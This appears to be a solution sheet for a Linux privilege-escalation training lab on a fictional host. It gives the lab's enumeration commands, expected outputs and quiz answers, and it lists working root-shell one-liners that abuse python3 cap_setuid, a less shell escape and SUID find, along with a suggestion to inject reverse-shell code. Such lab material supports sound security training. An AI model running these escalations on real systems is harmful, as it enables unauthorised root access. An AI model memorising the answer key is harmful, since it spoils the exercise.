# CLH-026: Access Control - Solution Sheet

**Module:** CLH-026
**Title:** Access Control (Privilege Escalation)
**Tier:** CLI Wraith
**Theme:** Linux privilege escalation techniques

---

## Scenario Overview

You are `infiltrator@EMBASSY-SRV`, an operator who has gained initial access to a target system. Your mission is to enumerate privilege escalation vectors and identify the fastest path to root access using Linux capabilities, SUID binaries, and sudo misconfigurations.

---

## Objectives & Solutions

### Objective 1: RECON - Confirm Your Access Level
**Task:** Identify your current user and group memberships
**Hint:** `id`

**Solution:**
```bash
id
```

**Expected Output:**
```
uid=1001(infiltrator) gid=1001(infiltrator) groups=1001(infiltrator),27(sudo)
```

**Analysis:** You are `infiltrator` with sudo group membership - but what can you actually run?

---

### Objective 2: ENUM - Check What You Can Sudo
**Task:** List your sudo permissions
**Hint:** `sudo -l`

**Solution:**
```bash
sudo -l
```

**Expected Output:**
```
User infiltrator may run the following commands on EMBASSY-SRV:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/report.py
    (ALL) NOPASSWD: /usr/bin/less /var/log/auth.log
```

**Analysis:** Two sudo entries:
1. Can run a specific Python script as root (check if writable!)
2. Can run `less` on auth.log (shell escape possible with `!sh`)

---

### Objective 3: ENUM - Scan for Dangerous Capabilities
**Task:** Find binaries with Linux capabilities set
**Hint:** `getcap -r / 2>/dev/null`

**Solution:**
```bash
getcap -r / 2>/dev/null
```

**Expected Output:**
```
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

**Analysis:** **CRITICAL FINDING!** Python3.10 has `cap_setuid=ep` - this allows it to change its UID to any user, including root (UID 0).

---

### Objective 4: ANALYZE - Read the Recon Notes
**Task:** Review previous reconnaissance findings
**Hint:** Check `~/recon/` and `~/privesc_notes/`

**Solution:**
```bash
cat ~/recon/capabilities.txt
```
or
```bash
cat ~/privesc_notes/sudo_rules.txt
```

**Expected Output (capabilities.txt):**
```
LINUX CAPABILITIES - Recon Notes
=================================
Previous operator ran partial scan but results corrupted.

WHAT TO LOOK FOR:
- cap_setuid=ep : Can change UID to any user (ROOT!)
- cap_setgid=ep : Can change GID to any group
- cap_net_raw=ep : Can send raw packets (normal for ping)
...
```

**Analysis:** The notes explain what to look for but don't give the answer directly - you must run `getcap` yourself.

---

### Objective 5: IDENTIFY - Find the Easiest Escalation Path
**Task:** Determine the best privilege escalation method
**Hint:** Check `~/exploits/attack_plan.txt`

**Solution:**
```bash
cat ~/exploits/attack_plan.txt
```

**Expected Output:**
```
PRIVILEGE ESCALATION ATTACK PLAN
=================================
Operation: EMBASSY BREACH
Target: root access

ENUMERATION CHECKLIST:
[ ] sudo -l : What can we run as root?
[ ] getcap -r / 2>/dev/null : Any dangerous capabilities?
[ ] find / -perm -4000 : SUID binaries?
[ ] ls -la /opt/scripts/ : World-writable scripts?

MULTIPLE PATHS MAY EXIST:
- Capability abuse (if cap_setuid found)
- Sudo misconfiguration
- SUID binary exploitation
- Writable script injection

PRIORITY: Run capability scan first - fastest path to root.
Look for scripting languages with cap_setuid!
```

**Analysis:** The plan guides you to run `getcap` and look for scripting languages with cap_setuid.

---

## Insight Phase

**Question:** Your getcap scan found a binary with cap_setuid=ep. This capability allows a program to change its user ID to ANY user - including root (UID 0). Which binary has this dangerous capability?

**Answer:** `python3`

**Accepted variations:** "python3", "python3.10", "/usr/bin/python3", "/usr/bin/python3.10", "python"

**How to find:** Run `getcap -r / 2>/dev/null` and look for `cap_setuid=ep` in the output.

---

## Privilege Escalation Paths

### Path A: Python Capability Exploit (EASIEST)
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
**Result:** Instant root shell. No file modification needed.

### Path B: Sudo + Less Shell Escape
```bash
sudo /usr/bin/less /var/log/auth.log
# Then type: !sh
```
**Result:** Root shell via less shell escape.

### Path C: Sudo + Writable Script
```bash
# Check if report.py is writable
ls -la /opt/scripts/report.py
# If writable, add reverse shell code
# Then run: sudo /usr/bin/python3 /opt/scripts/report.py
```

### Path D: SUID Find Binary
```bash
find . -exec /bin/sh -p \; -quit
```

---

## Key Findings Summary

| Vector | Exploitability | Notes |
|--------|----------------|-------|
| cap_setuid on python3.10 | **HIGH** | Direct UID change to root |
| sudo less | MEDIUM | Shell escape with !sh |
| sudo python3 report.py | MEDIUM | Requires writable script |
| SUID find | MEDIUM | Requires -p flag for shell |
| SUID vim | MEDIUM | Can spawn shell |

---

## Linux Capabilities Reference

```
cap_setuid=ep  - Can change UID to any user (CRITICAL)
cap_setgid=ep  - Can change GID to any group
cap_net_raw=ep - Can send raw packets (normal for ping)
cap_net_admin  - Can configure network interfaces
cap_sys_admin  - Near-root capabilities
```

The `=ep` means:
- `e` = Effective (capability is active)
- `p` = Permitted (capability can be used)

---

## Additional Investigation Commands

```bash
# Find all SUID binaries
find / -perm -4000 2>/dev/null

# Check for world-writable files
find / -perm -o+w -type f 2>/dev/null

# Check GTFOBins notes
cat ~/exploits/gtfobins_notes.txt

# View weak permissions analysis
cat ~/privesc_notes/weak_perms.txt
```

---

## IOCs (Indicators of Compromise)

| Finding | Value |
|---------|-------|
| Dangerous Capability | /usr/bin/python3.10 cap_setuid=ep |
| Sudo Misconfiguration | NOPASSWD on less (shell escape) |
| Writable Script | /opt/scripts/report.py (0777) |
| SUID Binary | /usr/bin/find |
| SUID Binary | /usr/bin/vim |

---

*Last Updated: February 2, 2026*
